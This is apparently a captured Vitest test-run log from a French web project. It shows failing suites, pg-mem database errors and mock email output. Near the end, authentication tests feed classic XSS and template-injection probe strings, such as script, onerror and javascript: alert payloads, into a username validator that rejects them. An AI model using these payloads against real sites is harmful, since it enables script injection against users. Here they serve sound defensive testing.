
[1m[46m RUN [49m[22m [36mv4.0.18 [39m[90mC:/Users/Utilisateur/Documents/concordia[39m

[90mstdout[2m | tests/ssr/ssr-hydration-errors.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/theme.test.ts
[22m[39m
­ƒº¬ Starting test suite...


npx : [90mstderr[2m | 
tests/ssr/ssr-hydration-errors.test.ts
Au caractère Ligne:1 : 1
+ npx vitest run 2>&1 | Out-File -FilePath 
test-output.txt -Encoding ut ...
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: ([90mstd 
   err[2m...-errors.test.ts:String) [], RemoteExcep  
  tion
    + FullyQualifiedErrorId : NativeCommandError
 
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstderr[2m | tests/unit/theme.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/unit/theme.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/unit/theme.test.ts [2m([22m[2m6 tests[22m[2m | [22m[31m6 failed[39m[2m)[22m[33m 568[2mms[22m[39m
[31m     [31m├ù[31m getTheme prefers stored value over media[39m[32m 25[2mms[22m[39m
[31m     [31m├ù[31m getTheme falls back to cookie when localStorage throws[39m[32m 9[2mms[22m[39m
[31m     [31m├ù[31m getTheme defaults to prefers-color-scheme when nothing stored[39m[32m 3[2mms[22m[39m
[31m     [31m├ù[31m setTheme applies attribute and persists[39m[32m 45[2mms[22m[39m
[31m     [31m├ù[31m initTheme writes initial attribute[39m[32m 4[2mms[22m[39m
[31m     [31m├ù[31m dispatches themechange event when set[39m[32m 5[2mms[22m[39m
[90mstdout[2m | tests/ssr/ssr-hydration-errors.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/ssr/ssr-hydration-errors.test.ts [2m([22m[2m2 tests[22m[2m | [22m[31m1 failed[39m[2m)[22m[33m 845[2mms[22m[39m
[31m     [31m├ù[31m renders homepage for all locales[39m[32m 245[2mms[22m[39m
     [32mÔ£ô[39m returns 404 for unknown routes[32m 91[2mms[22m[39m
[90mstdout[2m | tests/security/security.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ­ƒöÉ prevent committing .env to code: https://dotenvx.com/precommit

[90mstdout[2m | tests/security/security.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/security/security.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mRBAC/ABAC[2m > [22m[2mrefuse acc├¿s admin sans r├┤le
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463473356-0.5021638203061818'[39m,
  to: [32m'test-4609f1a1-dd25-4747-8072-0bda13fa0974@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ­ƒöÉ prevent building .env in docker: https://dotenvx.com/prebuild

[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mRBAC/ABAC[2m > [22m[2mautorise acc├¿s admin avec r├┤le
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474138-0.6379982907771375'[39m,
  to: [32m'test-a3e944ab-ca50-4bfe-921e-05eceb889f81@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

 [31mÔØ»[39m tests/a11y/a11y-performance.test.ts [2m([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mEmail Verification[2m > [22m[2mshould call sendVerificationEmail without error
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474587-0.9907669168418445'[39m,
  to: [32m'test@example.com'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mEmail Verification[2m > [22m[2mshould log mock SMTP when email verification is called
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474598-0.9983935416596401'[39m,
  to: [32m'test@example.com'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mPassword Reset[2m > [22m[2mshould call sendResetPassword without error
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474621-0.8953027796585231'[39m,
  to: [32m'test@example.com'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-emails.test.ts[2m > [22m[2mBetterAuth Email Functions[2m > [22m[2mPassword Reset[2m > [22m[2mshould log mock SMTP when password reset is called
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474630-0.8974615002289994'[39m,
  to: [32m'test@example.com'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-emails.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/integration/auth-emails.test.ts [2m([22m[2m6 tests[22m[2m | [22m[31m2 failed[39m[2m)[22m[32m 188[2mms[22m[39m
       [32mÔ£ô[39m should have email verification config[32m 9[2mms[22m[39m
       [32mÔ£ô[39m should call sendVerificationEmail without error[32m 12[2mms[22m[39m
[31m       [31m├ù[31m should log mock SMTP when email verification is called[39m[32m 16[2mms[22m[39m
       [32mÔ£ô[39m should have sendResetPassword config[32m 6[2mms[22m[39m
       [32mÔ£ô[39m should call sendResetPassword without error[32m 8[2mms[22m[39m
[31m       [31m├ù[31m should log mock SMTP when password reset is called[39m[32m 9[2mms[22m[39m
[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mRBAC/ABAC[2m > [22m[2mrefuse escalade de privil├¿ge
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463474878-0.265340474481885'[39m,
  to: [32m'test-d66c9a74-97f7-4a0b-9356-e6a568111463@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mXSS[2m > [22m[2mrejette payload XSS dans formulaire
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463476022-0.1395824845602145'[39m,
  to: [32m'test-dcd685d6-e50d-4591-9416-c3eb0c12033a@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/comments.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ÔÜÖ´©Å  enable debug logging with { debug: true }

 [31mÔØ»[39m tests/integration/comments.test.ts [2m([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mInjection[2m > [22m[2mrejette payload SQLi
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463477259-0.14528661318627956'[39m,
  to: [32m'test-2300d996-e179-4c17-9ae1-6533b14e4eea@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mInjection[2m > [22m[2mrejette payload NoSQLi
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463478158-0.7614521527889482'[39m,
  to: [32m'test-0ade9d11-fc5c-4dfe-8b11-c352edbe0f98@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

 [31mÔØ»[39m tests/e2e/critical-flows.test.ts [2m([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | tests/security/security.test.ts[2m > [22m[2mEscalade[2m > [22m[2mrefuse modification de r├┤le sans autorisation
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463478842-0.692525783775684'[39m,
  to: [32m'test-44f31d8e-ef51-43c8-af01-44ebf542c2df@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/security/security.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/security/security.test.ts [2m([22m[2m7 tests[22m[2m | [22m[31m7 failed[39m[2m)[22m[33m 6286[2mms[22m[39m
[31m     [31m├ù[31m refuse acc├¿s admin sans r├┤le[39m[33m 752[2mms[22m[39m
[31m     [31m├ù[31m autorise acc├¿s admin avec r├┤le[39m[33m 707[2mms[22m[39m
[31m     [31m├ù[31m refuse escalade de privil├¿ge[39m[33m 888[2mms[22m[39m
[31m     [31m├ù[31m rejette payload XSS dans formulaire[39m[33m 1269[2mms[22m[39m
[31m     [31m├ù[31m rejette payload SQLi[39m[33m 1046[2mms[22m[39m
[31m     [31m├ù[31m rejette payload NoSQLi[39m[33m 800[2mms[22m[39m
[31m     [31m├ù[31m refuse modification de r├┤le sans autorisation[39m[33m 698[2mms[22m[39m
 [31mÔØ»[39m tests/e2e/ui/alert.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/badge.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/button.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/card.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/code.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/dialog.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/dropdown.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/form.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/kbd.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/link.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/menudropdown.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/sheet.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/switch.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/table.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/tabs.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/tooltip.test.ts [2m([22m[2m0 test[22m[2m)[22m
 [31mÔØ»[39m tests/e2e/ui/video.test.ts [2m([22m[2m0 test[22m[2m)[22m
[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ÔÜÖ´©Å  suppress all logs with { quiet: true }

[90mstdout[2m | tests/unit/validation.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ÔÜÖ´©Å  override existing env vars with { override: true }

[90mstderr[2m | tests/unit/validation.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mInscription S├®curis├®e[2m > [22m[2mcr├®e utilisateur avec password fort
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463498662-0.7123188862549164'[39m,
  to: [32m'test-6c237f3f-41a3-4cd2-a458-ad7828cca0c5@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <script>alert(1)</script>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: "<script>alert(1)</script>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: '-alert(1)-'
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <img src=x onerror=alert(1)>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: javascript:alert(1)
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: ${alert(1)}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: 
{{constructor.constructor("alert(1)")()}}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:97:36)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <iframe 
src="javascript:alert(1)"></iframe>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <body onload=alert(1)>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <input onfocus=alert(1) 
autofocus>
